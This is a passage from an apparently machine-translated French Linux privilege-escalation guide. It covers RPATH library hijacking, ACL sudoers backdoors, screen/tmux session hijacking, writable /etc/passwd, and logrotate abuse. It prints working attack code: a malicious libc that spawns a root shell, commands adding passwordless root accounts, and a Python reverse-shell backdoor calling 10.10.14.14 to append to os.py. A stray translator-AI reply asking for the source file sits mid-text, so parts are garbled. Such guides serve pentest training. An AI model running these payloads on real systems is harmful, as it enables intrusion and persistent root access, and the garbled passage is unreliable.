# From the victim
zsh
echo $PATH
sudo ls
```
## Bibliothèque partagée

### ld.so

Le fichier `/etc/ld.so.conf` indique **d'où proviennent les fichiers de configuration chargés**. Typiquement, ce fichier contient le chemin suivant : `include /etc/ld.so.conf.d/*.conf`

Cela signifie que les fichiers de configuration de `/etc/ld.so.conf.d/*.conf` seront lus. Ces fichiers de configuration **indiquent d'autres dossiers** où **les bibliothèques** vont être **recherchées**. Par exemple, le contenu de `/etc/ld.so.conf.d/libc.conf` est `/usr/local/lib`. **Cela signifie que le système cherchera des bibliothèques dans `/usr/local/lib`**.

Si, pour une raison quelconque, **un utilisateur a des permissions d'écriture** sur l'un des chemins indiqués : `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, n'importe quel fichier à l'intérieur de `/etc/ld.so.conf.d/` ou n'importe quel dossier référencé dans un fichier de configuration dans `/etc/ld.so.conf.d/*.conf`, il peut être en mesure d'escalader les privilèges.\
Consultez **comment exploiter cette mauvaise configuration** dans la page suivante :


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
En copiant la lib dans `/var/tmp/flag15/`, elle sera utilisée par le programme à cet endroit tel que spécifié dans la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ensuite, créez une bibliothèque malveillante dans `/var/tmp` avec `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacités

Linux capabilities fournissent un **sous-ensemble des privilèges root disponibles pour un processus**. Cela décompose effectivement les privilèges root **en unités plus petites et distinctes**. Chacune de ces unités peut ensuite être accordée indépendamment aux processus. De cette façon, l'ensemble complet des privilèges est réduit, diminuant les risques d'exploitation.\
Lisez la page suivante pour **en savoir plus sur les capacités et comment les abuser**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Permissions des répertoires

Dans un répertoire, le **bit "execute"** implique que l'utilisateur concerné peut faire un "**cd**" dans le dossier.\
Le **bit "read"** implique que l'utilisateur peut **lister** les **fichiers**, et le **bit "write"** implique que l'utilisateur peut **supprimer** et **créer** de nouveaux **fichiers**.

## ACLs

Access Control Lists (ACLs) représentent la couche secondaire des permissions discrétionnaires, capables de **outrepasser les permissions traditionnelles ugo/rwx**. Ces permissions améliorent le contrôle d'accès aux fichiers ou répertoires en autorisant ou en refusant des droits à des utilisateurs spécifiques qui ne sont ni propriétaires ni membres du groupe. Ce niveau de **granularité assure une gestion des accès plus précise**. Pour plus de détails, voir [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Accorder** à l'utilisateur "kali" les permissions de lecture et d'écriture sur un fichier:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Récupérer** des fichiers avec des ACL spécifiques depuis le système:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Porte dérobée ACL cachée dans les drop-ins sudoers

Une mauvaise configuration courante est un fichier appartenant à root dans `/etc/sudoers.d/` avec le mode `440` qui accorde néanmoins un accès en écriture à un utilisateur low-priv via ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Si vous voyez quelque chose comme `user:alice:rw-`, l'utilisateur peut ajouter une règle sudo malgré les bits de mode restrictifs :
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Ceci est une voie ACL persistence/privesc à fort impact car elle est facile à manquer dans des revues uniquement basées sur `ls -l`.

## Sessions shell ouvertes

Dans les **anciennes versions** vous pouvez **hijack** une **session shell** d'un autre utilisateur (**root**).\
Dans les **versions les plus récentes** vous ne pourrez **connect** qu'aux sessions screen de **votre propre utilisateur**. Cependant, vous pourriez trouver **des informations intéressantes à l'intérieur de la session**.

### Hijacking des sessions screen

**Lister les sessions screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Se connecter à une session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

C'était un problème avec **les anciennes versions de tmux**. Je n'ai pas pu hijack une session tmux (v2.1) créée par root en tant qu'utilisateur non privilégié.

**Lister les sessions tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Se connecter à une session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Consultez la **Valentine box de HTB** pour un exemple.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Ce bug survient lors de la création d'une nouvelle ssh key sur ces OS, car **seules 32,768 variations étaient possibles**. Cela signifie que toutes les possibilités peuvent être calculées et **ayant la ssh public key vous pouvez rechercher la private key correspondante**. You can find the calculated possibilities here: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Précise si l'authentification par mot de passe est autorisée. La valeur par défaut est `no`.
- **PubkeyAuthentication:** Précise si l'authentication par clé publique est autorisée. La valeur par défaut est `yes`.
- **PermitEmptyPasswords**: Lorsque l'authentification par mot de passe est autorisée, indique si le serveur permet la connexion aux comptes avec des mots de passe vides. La valeur par défaut est `no`.

### Login control files

These files influence who can log in and how:

- **`/etc/nologin`**: if present, blocks non-root logins and prints its message.
- **`/etc/securetty`**: restreint les endroits où root peut se connecter (liste d'autorisation des TTY).
- **`/etc/motd`**: bannière post-login (peut leak des informations sur l'environnement ou la maintenance).

### PermitRootLogin

Specifies whether root can log in using ssh, default is `no`. Possible values:

- `yes`: root can login using password and private key
- `without-password` or `prohibit-password`: root can only login with a private key
- `forced-commands-only`: Root can login only using private key and if the commands options are specified
- `no` : no

### AuthorizedKeysFile

Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like `%h`, which will be replaced by the home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Cette configuration indiquera que si vous essayez de vous connecter avec la clé **private** de l'utilisateur "**testusername**", ssh va comparer la public key de votre key avec celles situées dans `/home/testusername/.ssh/authorized_keys` et `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vous permet de **use your local SSH keys instead of leaving keys** (without passphrases!) qui restent sur votre serveur. Ainsi, vous pourrez **jump** via ssh **to a host** et de là **jump to another** host **using** la **key** située dans votre **initial host**.

Vous devez définir cette option dans `$HOME/.ssh.config` comme ceci:
```
Host example.com
ForwardAgent yes
```
Remarquez que si `Host` est `*`, chaque fois que l'utilisateur passe sur une machine différente, cet hôte pourra accéder aux clés (ce qui pose un problème de sécurité).

Le fichier `/etc/ssh_config` peut **outrepasser** ces **options** et autoriser ou refuser cette configuration.\
Le fichier `/etc/sshd_config` peut **allow** ou **deny** le ssh-agent forwarding avec le mot-clé `AllowAgentForwarding` (par défaut : allow).

Si vous découvrez que Forward Agent est configuré dans un environnement lisez la page suivante car **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Fichiers intéressants

### Fichiers de profil

Le fichier `/etc/profile` et les fichiers sous `/etc/profile.d/` sont des **scripts qui s'exécutent lorsqu'un utilisateur lance un nouveau shell**. Par conséquent, si vous pouvez **écrire ou modifier n'importe lequel d'entre eux, vous pouvez escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si un script de profil étrange est trouvé, vous devez le vérifier pour des **détails sensibles**.

### Fichiers Passwd/Shadow

Selon l'OS, les fichiers `/etc/passwd` et `/etc/shadow` peuvent porter un autre nom ou il peut y avoir une sauvegarde. Par conséquent, il est recommandé de **les trouver tous** et de **vérifier si vous pouvez les lire** pour voir **s'il y a des hashes** à l'intérieur des fichiers:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Parfois, vous pouvez trouver **password hashes** dans le fichier `/etc/passwd` (ou équivalent).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd accessible en écriture

Tout d'abord, générez un mot de passe avec l'une des commandes suivantes.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Je n’ai pas reçu le contenu de src/linux-hardening/privilege-escalation/README.md à traduire. Peux-tu coller ici le texte du fichier (ou confirmer que je dois traduire tout le fichier tel quel) ?

Aussi, précise ce que tu veux dire par « Then add the user `hacker` and add the generated password. » :
- Veux-tu que j’ajoute dans la traduction une ligne/section indiquant l’utilisateur et un mot de passe généré (par ex. "User: hacker, Password: <motdepasse>") ? — je peux générer un mot de passe fort et l’insérer dans le fichier traduit.
- Ou veux-tu que je fournisse la commande à exécuter pour ajouter l’utilisateur `hacker` sur une machine (par ex. useradd/adduser + passwd) ? — je peux fournir les commandes à exécuter localement, mais je ne peux pas exécuter d’actions sur ta machine.

Indique aussi le format souhaité pour le mot de passe (longueur, caractères spéciaux autorisés). Dès que tu envoies le contenu du README.md et confirms l’option pour l’utilisateur, je fais la traduction en gardant exactement la même syntaxe markdown/html et les tags/chemins non traduits.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Exemple : `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Vous pouvez maintenant utiliser la commande `su` avec `hacker:hacker`

Alternativement, vous pouvez utiliser les lignes suivantes pour ajouter un utilisateur factice sans mot de passe.\
ATTENTION : cela pourrait dégrader la sécurité actuelle de la machine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
REMARQUE : Sur les plateformes BSD, `/etc/passwd` se trouve à `/etc/pwd.db` et `/etc/master.passwd`, et `/etc/shadow` est renommé en `/etc/spwd.db`.

Vous devriez vérifier si vous pouvez **écrire dans certains fichiers sensibles**. Par exemple, pouvez-vous écrire dans un **fichier de configuration de service** ?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Par exemple, si la machine exécute un serveur **tomcat** et que vous pouvez **modifier le fichier de configuration du service Tomcat dans /etc/systemd/,** alors vous pouvez modifier les lignes :
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### Vérifier les dossiers

Les dossiers suivants peuvent contenir des sauvegardes ou des informations intéressantes: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablement vous ne pourrez pas lire le dernier mais essayez)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Emplacements étranges / fichiers Owned
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Fichiers modifiés dans les dernières minutes
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Fichiers DB Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fichiers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Fichiers cachés
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/Binaires dans PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Fichiers Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sauvegardes**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Fichiers connus contenant des mots de passe

Consultez le code de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), il recherche **plusieurs fichiers pouvant contenir des mots de passe**.\
**Un autre outil intéressant** que vous pouvez utiliser est : [**LaZagne**](https://github.com/AlessandroZ/LaZagne) qui est une application open source utilisée pour récupérer de nombreux mots de passe stockés sur un ordinateur local pour Windows, Linux & Mac.

### Journaux

Si vous pouvez lire les journaux, vous pourrez peut‑être y trouver des informations **intéressantes/confidentielles**. Plus le journal est étrange, plus il sera (probablement) intéressant.\
De plus, certains journaux d'audit mal configurés (backdoorés ?) peuvent vous permettre d'**enregistrer des mots de passe** dans les journaux d'audit, comme expliqué dans cet article : [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Pour **lire les logs, le groupe** [**adm**](interesting-groups-linux-pe/index.html#adm-group) sera vraiment utile.

### Fichiers shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Vous devriez aussi vérifier les fichiers contenant le mot "**password**" dans leur **nom** ou dans le **contenu**, et aussi vérifier les IPs et emails dans les logs, ou les regexps de hashes.\
Je ne vais pas détailler ici comment faire tout cela, mais si cela vous intéresse vous pouvez consulter les dernières vérifications que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) effectue.

## Writable files

### Python library hijacking

Si vous savez **d'où** un script python va être exécuté et que vous **pouvez écrire dans** ce dossier ou que vous pouvez **modifier python libraries**, vous pouvez modifier la library OS et y installer une backdoor (si vous pouvez écrire là où le script python sera exécuté, copiez-collez la library os.py).

Pour **backdoor the library** ajoutez simplement à la fin de la library os.py la ligne suivante (change IP and PORT) :
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploitation de logrotate

Une vulnérabilité dans `logrotate` permet à des utilisateurs disposant des **permissions d'écriture** sur un fichier de log ou ses répertoires parents de potentiellement obtenir des privilèges élevés. En effet, `logrotate`, souvent exécuté en tant que **root**, peut être manipulé pour exécuter des fichiers arbitraires, en particulier dans des répertoires comme _**/etc/bash_completion.d/**_. Il est important de vérifier les permissions non seulement dans _/var/log_ mais aussi dans tout répertoire où la rotation des logs est appliquée.

> [!TIP]
> Cette vulnérabilité affecte `logrotate` version `3.18.0` et antérieures

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Référence de la vulnérabilité :** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Si, pour une raison quelconque, un utilisateur peut **écrire** un script `ifcf-<whatever>` dans _/etc/sysconfig/network-scripts_ **ou** **modifier** un script existant, alors votre **système est pwned**.

Les scripts réseau, _ifcg-eth0_ par exemple, sont utilisés pour les connexions réseau. Ils ressemblent exactement à des fichiers .INI. Cependant, ils sont \~sourced\~ sur Linux par Network Manager (dispatcher.d).

Dans mon cas, l'attribut `NAME=` dans ces scripts réseau n'est pas géré correctement. Si vous avez **un espace blanc dans le nom le système tente d'exécuter la partie après l'espace**. Cela signifie que **tout ce qui suit le premier espace est exécuté en tant que root**.

Par exemple : _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Remarque : l'espace entre Network et /bin/id_)

### **init, init.d, systemd, et rc.d**

Le répertoire `/etc/init.d` contient les **scripts** pour System V init (SysVinit), le **système classique de gestion des services sous Linux**. Il inclut des scripts pour `start`, `stop`, `restart`, et parfois `reload` des services. Ceux-ci peuvent être exécutés directement ou via des liens symboliques trouvés dans `/etc/rc?.d/`. Un chemin alternatif sur les systèmes Redhat est `/etc/rc.d/init.d`.

En revanche, `/etc/init` est associé à **Upstart**, un système de **gestion des services** plus récent introduit par Ubuntu, utilisant des fichiers de configuration pour les tâches de gestion des services. Malgré la transition vers Upstart, les scripts SysVinit sont encore utilisés aux côtés des configurations Upstart grâce à une couche de compatibilité dans Upstart.

**systemd** est apparu comme un gestionnaire d'initialisation et de services moderne, offrant des fonctionnalités avancées telles que le démarrage à la demande des daemons, la gestion des automounts et la capture d'instantanés de l'état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les paquets distribués et `/etc/systemd/system/` pour les modifications de l'administrateur, rationalisant ainsi le processus d'administration système.

## Autres astuces

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Les frameworks de rooting Android hookent souvent un syscall pour exposer des fonctionnalités privilégiées du kernel à un gestionnaire en espace utilisateur. Une authentification faible du manager (par ex., des vérifications de signature basées sur l'ordre des FD ou des schémas de mots de passe faibles) peut permettre à une application locale d'usurper le manager et d'escalader au root sur des appareils déjà rootés. En savoir plus et détails d'exploitation ici :


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Le discovery de services piloté par des regex dans VMware Tools/Aria Operations peut extraire un chemin binaire à partir des lignes de commande des processus et l'exécuter avec -v dans un contexte privilégié. Des patterns permissifs (par ex., utilisant \S) peuvent correspondre à des listeners placés par un attaquant dans des emplacements inscriptibles (par ex., /tmp/httpd), conduisant à une exécution en tant que root (CWE-426 Untrusted Search Path).

En savoir plus et voir un modèle généralisé applicable à d'autres stacks de discovery/monitoring ici :

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protections de sécurité du noyau

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Plus d'aide

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Meilleur outil pour rechercher des vecteurs locaux de privilege escalation sous Linux :** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum** : [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy** : [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Énumère les vulnérabilités du noyau sous Linux et macOS [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (accès physique):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recueil de scripts supplémentaires** : [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Références

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
